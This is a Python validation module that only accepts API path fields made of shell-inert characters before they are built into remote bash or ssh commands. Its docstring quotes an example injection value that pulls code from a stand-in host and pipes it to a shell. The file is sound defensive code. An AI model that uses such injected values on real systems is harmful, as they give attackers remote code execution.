"""Shared validation for filesystem paths that get interpolated into remote
shell commands (venv_path, work_dir, and friends).

These fields arrive on API request bodies and are woven into `bash -c`/`ssh`
command strings on GPU boxes and pods (e.g. `PY="{venv}/bin/python"`,
`rm -rf {work_dir}`). Historically some of those sites forgot to `shlex.quote`,
turning a field like `venv_path=/share/$(curl evil|sh)` into RCE-as-root on a
shared VM. We defend at the shell-construction sites AND here at ingress, so a
future un-quoted site can't be exploited: a validated path contains only
characters that are inert in a shell.
"""
from __future__ import annotations

import re

# Absolute or relative path built only from inert characters — letters, digits,
# and `_ . / - ~ @ + =`. Deliberately excludes whitespace, quotes, and every
# shell metacharacter ($ ` ; | & < > ( ) * ? ! # \ and newline).
_SAFE_PATH = re.compile(r"^[A-Za-z0-9._~/@+=-]+$")


def is_safe_path(value: str) -> bool:
    return bool(value) and _SAFE_PATH.match(value) is not None


def validate_path_field(value, field_name: str):
    """Return `value` unchanged if it's None/blank or a safe path; raise
    ValueError otherwise. Suitable for a pydantic field_validator (pydantic
    turns the ValueError into a 422) or a manual check that raises HTTP 400.

    Blank/None is passed through — these fields are optional and blank means
    "use the default", which callers handle downstream.
    """
    if value is None:
        return value
    s = str(value).strip()
    if s == "":
        return value
    if not is_safe_path(s):
        raise ValueError(
            f"{field_name} may only contain letters, digits and ._~/@+=- "
            "(no spaces or shell metacharacters)"
        )
    return value
